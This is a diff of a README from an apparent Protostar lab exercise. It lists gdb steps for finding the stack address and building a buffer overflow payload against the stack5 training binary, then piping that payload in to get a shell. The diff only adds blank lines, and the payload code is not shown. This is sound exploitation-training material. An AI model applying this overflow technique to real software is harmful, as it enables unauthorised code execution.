@@ -22,16 +22,25 @@ payload.py is used to generate the input to pass to stack5.
   ⁃ If present, we delete global variables LINES and COLUMNS:
       - unset env LINES
       - unset env COLUMNS
+    
   ⁃ write: disassemble main
+  
   ⁃ Set the breakpoint just before the leave instruction: b * 'istruction_leave'
+  
   ⁃ r < /tmp/payload
+  
   ⁃ Print the contents of the pointer esp using the command x/a $esp
+  
   ⁃ Edit the python script by inserting the obtained value (es. 0xbffffca0) and run it again to get back the correct payload with the right address
       - nano stack5-payload.py
       - edit script
+
   ⁃ exit from gbd: q
+  
 4. Execute python stack5-payload.py > payload
+ 
 5. Write: (cat /tmp/payload; cat) | /opt/protostar/bin/stack5                          (*)
+
 6. F I N I S H
 
 
